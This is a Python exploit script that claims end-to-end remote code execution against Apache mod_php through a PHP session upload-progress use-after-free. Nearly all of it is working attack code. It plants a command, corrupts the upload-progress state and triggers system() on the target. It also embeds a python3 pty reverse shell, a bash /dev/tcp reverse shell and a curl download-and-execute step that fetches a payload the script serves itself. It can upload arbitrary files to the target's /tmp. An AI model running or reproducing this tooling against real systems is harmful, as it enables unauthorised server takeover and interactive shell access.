#!/usr/bin/env python3
"""uaf_rce.py — PHP session.upload_progress UAF: end-to-end network RCE.

CVE-2026-109618 arm (upload-progress OOM-window machinery) + staleness
consumer (frozen bytes_processed, CVE-adjacent, survives the vendor fix)
+ in-band dial-back: the target needs ONLY the 30-line app.php in its
docroot — no env vars, no extensions, no CMS. Venue requirement: Apache
mod_php (parse-before-RINIT is where the bug lives; php -S/php-fpm are
structurally immune to the cross-request leg).

Chain per run:
  R1 plant   -> session gets payload cmd + connect-back addr (+ optional
                --up upload, riding the same multipart); PLANTED=1
  R2 corrupt -> 200KB part + 150x2KB field spray; progress-entry
                bookkeeping wedges: bytes_processed freezes mid-upload
  R3 gate    -> app reads its OWN progress entry; frozen => system(cmd)
                dialing back to us.

Modes:
  (default)      pty shell: python3 dials back and pty.spawns bash on a REAL
                 pty target-side; we put the local terminal in raw mode, so
                 Ctrl-C, job control and tab-completion work. Falls back to
                 plain sh -i if the target has no python3 (auto-probed).
  --cmd CMD      banner: cmd output inline over the dial-back socket.
  --up FILE      upload FILE to the target's /tmp/uaf_NAME (rides R1's
                 multipart; ceiling = upload_max_filesize), then exec --run
                 CMD (banner) — default run checks the file landed.
  --serve [F]    initcmd idea: we HTTP-serve F (default: embedded
                 uaf_shell.py) on rport+2; target curls it down and execs it
                 as the connect-back shell. For targets without python3, or
                 to ship busybox/one-liners. --init overrides the
                 download+exec command ({URL} {H} {P} placeholders).
  --plain        sh -i over /dev/tcp (no pty; no python3 needed)
  --tty          server env has RSHELL_TTY=1: the APP dials interactive bash
  --n K          reliability sweep, banner mode

Ports on our side: rport (banner/receipt), rport+1 (shell), rport+2 (http
serve). Usage examples:

  ./uaf_rce.py 192.168.51.170:18990
  ./uaf_rce.py host:80 --up busybox.static --run '/tmp/uaf_busybox.static hostname'
  ./uaf_rce.py host:80 --serve            # downloads uaf_shell.py, pty shell
  ./uaf_rce.py host:80 --cmd 'id' --n 10

Verified on stock PHP 8.3.6 / Ubuntu 24.04 mod_php (10/21): 5/5 freeze+shell.
"""
import argparse, os, re, select, socket, sys, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PROG = 'PHP_SESSION_UPLOAD_PROGRESS'
BOUND = '----uaf'
R1_FILE = 4096
R2_FILE = 200000

# The default served payload: python3 pty reverse shell (target-side pty).
SHELL_SRC = '''"""uaf_shell.py — python3 pty reverse shell (payload for the UAF PoC)."""
import os, pty, socket, sys
h, p = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((h, p))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
os.environ.setdefault('TERM', 'vt100')
pty.spawn(["/bin/bash", "-i"])
'''

def local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 53)); return s.getsockname()[0]
    except OSError:
        return '127.0.0.1'
    finally:
        s.close()

def field(name, val):
    return (b'--' + BOUND.encode() + b'\r\nContent-Disposition: form-data; name="'
            + name.encode() + b'"\r\n\r\n' + val.encode() + b'\r\n')

def filepart(name, fname, data):
    return (b'--' + BOUND.encode() + b'\r\nContent-Disposition: form-data; name="'
            + name.encode() + b'"; filename="' + fname.encode() + b'"\r\n'
            b'Content-Type: application/octet-stream\r\n\r\n' + data + b'\r\n')

def http(host, port, path, body, timeout=15.0):
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        if body is not None:
            hdr = ('POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: multipart/form-data; '
                   'boundary=%s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
                   % (path, BOUND, len(body)))
            try:
                s.sendall(hdr.encode() + body)
            except BrokenPipeError:
                pass
        else:
            s.sendall(('GET %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n' % path).encode())
        s.settimeout(timeout)
        data = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        return data.decode('utf-8', 'replace')
    finally:
        s.close()

def ls_bind(port_, backlog=1, tmo=6):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port_)); s.listen(backlog); s.settimeout(tmo)
    return s

def relay_stdin(conn, timeout=1800):
    """Local stdin <-> socket until EOF either way. If stdin is a terminal we
    go raw (pass ^C/^Z/arrows to the target's pty); Ctrl-D (or `exit`) drops."""
    raw = sys.stdin.isatty()
    fdin = sys.stdin.fileno()
    if raw:
        import termios, tty, signal
        old = termios.tcgetattr(fdin)
        tty.setraw(fdin)
        old_sig = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, signal.SIG_IGN)
    try:
        conn.setblocking(False)
        cfd = conn.fileno()
        while True:
            r, _, _ = select.select([fdin, cfd], [], [], timeout)
            if cfd in r:
                try:
                    d = conn.recv(4096)
                except OSError:
                    break
                if not d:
                    break
                os.write(1, d)
            if fdin in r:
                try:
                    b = os.read(fdin, 1024)
                except OSError:
                    b = b''
                if not b:
                    try:
                        conn.shutdown(socket.SHUT_WR)
                    except OSError:
                        pass
                    break
                conn.sendall(b)
    finally:
        if raw:
            signal.signal(signal.SIGINT, old_sig)
            termios.tcsetattr(fdin, termios.TCSADRAIN, old)

def pty_cmd(rhost, rport1):
    # outer shell layer is escapeshellarg'd single quotes, so the python -c
    # payload uses double quotes outside / single quotes inside — no
    # backslashed quotes may reach python's parser (it eats them literally).
    return ('python3 -c "import os,pty,socket;'
            's=socket.create_connection((\'%s\',%d));'
            '[os.dup2(s.fileno(),f) for f in (0,1,2)];'
            'os.environ[\'TERM\']=\'vt100\';'
            'pty.spawn([\'/bin/bash\',\'-i\'])"' % (rhost, rport1))

def plain_cmd(rhost, rport1):
    return "bash -c 'exec 4<>/dev/tcp/%s/%d; exec sh -i <&4 >&4 2>&4'" % (rhost, rport1)

def run_once(host, port, rhost, rport, mode, cmd, n, up=None, serve=None, init=None):
    """mode in {banner, pty, plain, serve, tty}; up=(name,bytes);
    serve=(fname,bytes) to download+exec; init overrides the download cmd."""
    # PHP 8.3 vetting: session ids must stay in [0-9a-v] (sid_bits_per_character=5)
    sid = 'uu%02d%d' % (n, int(time.time()) % 100000)
    rport1, rport2 = rport + 1, rport + 2
    if mode in ('pty', 'plain'):
        cmd = pty_cmd(rhost, rport1) if mode == 'pty' else plain_cmd(rhost, rport1)
    elif mode == 'serve':
        fname, _ = serve
        if init:
            cmd = init.replace('{URL}', 'http://%s:%s/%s' % (rhost, rport2, fname)) \
                     .replace('{H}', rhost).replace('{P}', str(rport1))
        else:
            cmd = ("curl -sf http://%s:%d/%s -o /tmp/uaf_%s && python3 /tmp/uaf_%s %s %d"
                   % (rhost, rport2, fname, fname, fname, rhost, rport1))

    r1 = (field(PROG, 'pl') + field('pl', cmd) + field('rh', '%s:%d' % (rhost, rport))
          + (field('up', '1') if up else b'')
          + filepart('file', up[0] if up else 'p.bin', up[1] if up else b'A' * R1_FILE)
          + b'--' + BOUND.encode() + b'--\r\n')
    r2 = (field(PROG, 'pl') + filepart('file', 'p.bin', b'A' * R2_FILE)
          + b''.join(field('x[]', 'z' * 2048) for _ in range(150))
          + b'--' + BOUND.encode() + b'--\r\n')
    resp1 = http(host, port, '/app.php?PHPSESSID=%s' % sid, r1)
    if 'PLANTED=1' not in resp1:
        return dict(ok=False, shell=False, banner='', note='R1 failed: '
                    + (resp1.splitlines()[-1][:60] if resp1 else 'R1 no reply'))
    up_path = 'none'
    m = re.search(r'UP=(\S+)', resp1)
    if m:
        up_path = m.group(1)
    resp2 = http(host, port, '/app.php?PHPSESSID=%s' % sid, r2)
    if 'WINDOWS=' not in resp2:
        return dict(ok=False, shell=False, banner='', note='R2 worker crash/no-reply: '
                    + (resp2.splitlines() or [''])[0][:60])

    ls = ls_bind(rport)
    need_shell_sock = mode in ('pty', 'plain', 'serve')
    ls2 = ls_bind(rport1) if need_shell_sock else None
    if mode == 'tty':
        ls.settimeout(8)

    if need_shell_sock or mode == 'tty':
        r3box = []
        def fire():
            try:
                r3box.append(http(host, port, '/app.php?PHPSESSID=%s&pl=1' % sid, None, timeout=1800))
            except Exception as e:
                r3box.append('ERR %s' % e)
        t3 = threading.Thread(target=fire, daemon=True); t3.start()
        time.sleep(0.2)
        dialer = ls2 if need_shell_sock else ls
        shell_sock = None
        dialed = False
        for _ in range(2):
            try:
                shell_sock, _ = dialer.accept()
                dialed = True
                break
            except socket.timeout:
                if t3.is_alive():
                    t3.join(timeout=1)
        if dialed:
            print('    shell up — Ctrl-D or `exit` to drop back', flush=True)
            relay_stdin(shell_sock)
            try:
                shell_sock.close()
            except OSError:
                pass
        t3.join(timeout=10)
        banner = ''
        if need_shell_sock:
            try:
                bconn, _ = ls.accept()
                bconn.settimeout(5)
                banner = bconn.recv(4096).decode('utf-8', 'replace')
                bconn.close()
            except Exception:
                pass
        ls.close()
        if ls2:
            ls2.close()
        got = bool(r3box) and 'PLRUN' in r3box[0]
        return dict(ok=got, shell=dialed, banner=banner, up_path=up_path,
                    note='shell=%s r3=%s%s' % (dialed,
                          'ok' if got else (r3box[0][:40] if r3box else 'no-r3'),
                          (' UP=' + up_path) if up else ''))

    # banner mode (also the --up exec leg): template dials rport, runs cmd,
    # echoes the receipt
    box = []
    def relay():
        try:
            conn, _ = ls.accept(); conn.settimeout(15)
            data = b''
            while True:
                try:
                    c = conn.recv(4096)
                except socket.timeout:
                    break
                if not c:
                    break
                data += c
                if b'-revshell-OK' in data:
                    break
            box.append(data.decode('utf-8', 'replace'))
            conn.close()
        except Exception:
            pass
    th = threading.Thread(target=relay, daemon=True); th.start()
    resp3 = http(host, port, '/app.php?PHPSESSID=%s&pl=1' % sid, None)
    th.join(timeout=10)
    ls.close()
    m = re.search(r'PLRUN FROZEN=(\d)(?: INFLIGHT=\d)? BYTES=(\d+) CLEN=(\d+)', resp3 or '')
    frozen = tuple(int(g) for g in m.groups()) if m else (-1, -1, -1)
    shell = bool(box) and '-revshell-OK' in box[0]
    return dict(ok=frozen[0] == 1, shell=shell, banner=(box[0] if box else ''),
                up_path=up_path, frozen=frozen,
                note='frozen=%d bytes=%d/%d' % frozen)

class ServeOne(BaseHTTPRequestHandler):
    payload = b''
    fname = 'uaf_shell.py'
    def do_GET(self):
        if self.path.strip('/') in (self.fname, ''):
            self.send_response(200)
            self.send_header('Content-Length', str(len(self.payload)))
            self.end_headers()
            self.wfile.write(self.payload)
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, *a):
        pass

def main():
    ap = argparse.ArgumentParser(description='PHP upload-progress UAF end-to-end RCE')
    ap.add_argument('target', help='host[:port], port default 80')
    ap.add_argument('--cmd', default=None, help='banner mode: run this cmd, output inline')
    ap.add_argument('--up', metavar='FILE', help='upload FILE to target /tmp/uaf_NAME (rides R1 multipart)')
    ap.add_argument('--run', default=None, help='with --up: command to exec after upload (banner)')
    ap.add_argument('--serve', nargs='?', const='auto', metavar='FILE',
                    help='serve FILE over http (default: embedded uaf_shell.py); target downloads+execs it')
    ap.add_argument('--init', default=None, help='with --serve: download+exec cmd, {URL} {H} {P} placeholders')
    ap.add_argument('--plain', action='store_true', help='sh -i via /dev/tcp (no pty, no python3)')
    ap.add_argument('--tty', action='store_true', help='server has RSHELL_TTY=1: app dials interactive bash')
    ap.add_argument('--rhost', default=None, help='our IP for dial-back (auto-detected)')
    ap.add_argument('--rport', type=int, default=4455, help='dial-back port (shell +1, http serve +2)')
    ap.add_argument('--n', type=int, default=1, help='runs (reliability sweep when >1, banner mode)')
    args = ap.parse_args()
    host, _, port = args.target.partition(':')
    port = int(port or 80)
    rhost = args.rhost or local_ip()

    up = None
    if args.up:
        data = open(args.up, 'rb').read()
        if len(data) > 2 * 1024 * 1024:
            sys.exit('--up: file > 2M upload_max_filesize ceiling on stock 8.3 builds')
        up = (os.path.basename(args.up), data)
    serve = None
    if args.serve is not None:
        if args.serve == 'auto':
            serve = ('uaf_shell.py', SHELL_SRC.encode())
        else:
            serve = (os.path.basename(args.serve), open(args.serve, 'rb').read())

    mode = 'banner'
    if args.cmd or args.n > 1:
        mode = 'banner'
    elif args.serve is not None:
        mode = 'serve'
    elif args.tty:
        mode = 'tty'
    elif args.plain:
        mode = 'plain'
    elif not args.up:
        mode = 'pty'
    if args.up and args.run is None:
        args.run = 'id -un; wc -c %s' % ('/tmp/uaf_' + os.path.basename(args.up))

    cmd = args.cmd or (args.run if args.up else 'id -un; echo hello-from-uaf')

    # auto-probe for the pty default: banner round-trip with 'command -v python3'
    if mode == 'pty':
        pr = run_once(host, port, rhost, args.rport, 'banner', 'command -v python3 || echo NOPYTHON3', 99)
        if 'NOPYTHON3' in pr.get('banner', '') or not pr.get('shell'):
            print('    target lacks python3 (or probe shell failed) — falling back to --plain')
            mode = 'plain'

    hsrv = None
    if serve:
        ServeOne.payload, ServeOne.fname = serve[1], serve[0]
        hsrv = ThreadingHTTPServer(('0.0.0.0', args.rport + 2), ServeOne)
        threading.Thread(target=hsrv.serve_forever, daemon=True).start()
        print('    serving %d bytes on http://%s:%d/%s' % (len(serve[1]), rhost, args.rport + 2, serve[0]))

    good = 0
    for i in range(args.n):
        r = run_once(host, port, rhost, args.rport, mode, cmd, i, up=up, serve=serve, init=args.init)
        tag = '[%d/%d] ' % (i + 1, args.n) if args.n > 1 else ''
        line = tag + r['note']
        if mode == 'banner' and r.get('banner'):
            line += '  <- ' + ' / '.join(r['banner'].splitlines())
        print(line, flush=True)
        if r['ok'] and r['shell']:
            good += 1
    if hsrv:
        hsrv.shutdown()
    if args.n > 1:
        print('reliability: %d/%d' % (good, args.n))
    sys.exit(0 if good == args.n else 1)

if __name__ == '__main__':
    main()
